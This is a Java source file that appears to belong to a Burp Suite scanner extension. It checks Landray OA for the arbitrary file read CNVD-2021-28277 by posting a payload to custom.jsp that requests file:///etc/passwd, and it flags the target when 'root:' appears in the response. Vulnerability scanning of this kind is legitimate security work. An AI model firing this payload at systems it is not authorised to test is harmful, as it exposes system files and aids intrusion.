package com.alumm0x.task.cves.oa.landray;

import burp.*;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import org.jetbrains.annotations.NotNull;

import com.alumm0x.engine.TaskManager;
import com.alumm0x.impl.VulTaskImpl;
import com.alumm0x.ui.MainPanel;
import com.alumm0x.util.BurpReqRespTools;

import java.io.IOException;

public class LandrayOa extends VulTaskImpl {
    /**
     * CNVD-2021-28277
     * 蓝凌oa任意文件读取
     * https://www.cnvd.org.cn/flaw/show/CNVD-2021-28277
     *
     */

    public static VulTaskImpl getInstance(IHttpRequestResponse requestResponse){
        return new LandrayOa(requestResponse);
    }
    private LandrayOa(IHttpRequestResponse requestResponse) {
        super(requestResponse);
    }

    @Override
    public void run() {
        //新的请求包
        String url = BurpReqRespTools.getRootUrl(requestResponse) + "/sys/ui/extend/varkind/custom.jsp";
        String poc_body = "var={\"body\":{\"file\":\"file:///etc/passwd\"}}";
        //新请求
        okHttpRequester.send(
            url, 
            BurpReqRespTools.getMethod(requestResponse), 
            BurpReqRespTools.getReqHeaders(requestResponse), 
            null, 
            poc_body, 
            BurpReqRespTools.getContentType(requestResponse), 
            new LandrayOaCallback(this));
        TaskManager.vulsChecked.add(String.format("burp.vuls.oa.landray.LandrayOa_%s_%s",BurpReqRespTools.getHost(requestResponse),BurpReqRespTools.getPort(requestResponse))); //添加检测标记
    }
}

class LandrayOaCallback implements Callback {

    VulTaskImpl vulTask;

    public LandrayOaCallback(VulTaskImpl vulTask){
        this.vulTask = vulTask;
    }
    @Override
    public void onFailure(@NotNull Call call, @NotNull IOException e) {
        // 记录日志
        IHttpRequestResponse requestResponse = BurpReqRespTools.makeBurpReqRespFormOkhttp(call, null, vulTask.requestResponse);
        MainPanel.logAdd(
            requestResponse, 
            BurpReqRespTools.getHost(requestResponse), 
            BurpReqRespTools.getUrlPath(requestResponse),
            BurpReqRespTools.getMethod(requestResponse), 
            BurpReqRespTools.getStatus(requestResponse), 
            LandrayOa.class.getSimpleName(),
            "onFailure", 
            "[LandrayOaCallback-onFailure] " + e.getMessage());
    }

    @Override
    public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        String message = null;
        IHttpRequestResponse requestResponse = BurpReqRespTools.makeBurpReqRespFormOkhttp(call, response, vulTask.requestResponse);
        if (response.isSuccessful()){
            // 检查响应体是否有内容
            String respBody = new String(BurpReqRespTools.getRespBody(requestResponse));
            if (respBody.contains("root:")) {
                message = "LandrayOa-RadeAny";
            }
        }
        // 记录日志
        MainPanel.logAdd(
            requestResponse, 
            BurpReqRespTools.getHost(requestResponse), 
            BurpReqRespTools.getUrlPath(requestResponse),
            BurpReqRespTools.getMethod(requestResponse), 
            BurpReqRespTools.getStatus(requestResponse), 
            LandrayOa.class.getSimpleName(),
            message, 
            null);
    }
}